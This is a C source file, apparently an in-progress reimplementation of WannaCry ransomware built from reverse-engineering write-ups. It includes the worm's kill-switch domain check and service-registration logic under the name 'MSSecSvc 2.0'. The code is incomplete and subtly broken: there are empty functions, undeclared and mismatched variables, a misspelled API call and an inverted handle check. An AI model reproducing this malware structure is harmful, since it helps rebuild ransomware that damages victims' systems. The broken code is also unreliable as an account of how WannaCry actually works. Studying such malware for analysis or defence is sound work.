//https://medium.com/@yogeshojha/reverse-engineering-wannacry-ransomware-using-ghidra-finding-the-killswitch-a212807e9354
//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/

//Video: https://www.youtube.com/watch?v=Sv8yu12y5zM
//Video: https://www.youtube.com/watch?v=Q90uZS3taG0
//Video: https://www.youtube.com/watch?v=ru5VzUigKqw

#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

int create_service()
{

}

int no_argument_handler()
{
    //two functions here
    create_service();
}

//https://github.com/jnwilson/MalwareExercises/blob/0994222f90bd7de305ff8115dec053065f8d013f/Chapter%207/ex1.c
//https://github.com/StefanoBelli/lol/blob/92fd0e349ac42eb71ae9a1302559567cca64c0a1/Win32/ServiceLauncher.c
//https://github.com/sagishahar/scripts/blob/master/windows_service.c
int RealMain()
{
  SC_HANDLE hSCManager;
  SC_HANDLE SCObject;
  SERVICE_TABLE_ENTRYA Sstack;
  int *argc;
  char szName[] = "MSSecSvc";
  GetModuleFileName(NULL, &executable_path, sizeof(executable_path));
  
  argc = (int*)__argc();
  if(*argc < 2)
  {
     no_argument_handler();
  }
  
  /* https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
  hSCManager = OpenSCManager(0,0,SC_MANAGER_ALL_ACCESS);
  
  if(!hSCManager)
  {
    hSCObject = OpenServiceA(hSCManager, szName, SERVICE_START);
    if(!hSCObject)
    {
      //SomeFunction(hSCObject, 0x3c);
      CloseServiceHandle(hSCObject);
    }
    CloseServicehandle(hSCManager);
  }
  
  Sstack.lpServiceName = "MSSecSvc 2.0";
  Sstack.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

  StartServiceCtrlDispatcher(&Sstack);

  CloseServiceHandle(hSCManager);
  CloseServiceHandle(SCObject);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    char szUrl[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
    HINTERNET hInternet;
    HINTERNET hUrl;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    hUrl = InternetOpenUrl(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
    if (hUrl)
    {
      InternetCloseHandle(hUrl);
      InternetCloseHandle(hInternet);
      return 0;
    }
    else {
      InternetCloseHandle(hUrl);
      InternetCloseHandle(hInternet);
      RealMain();
    }
    return 0;
}
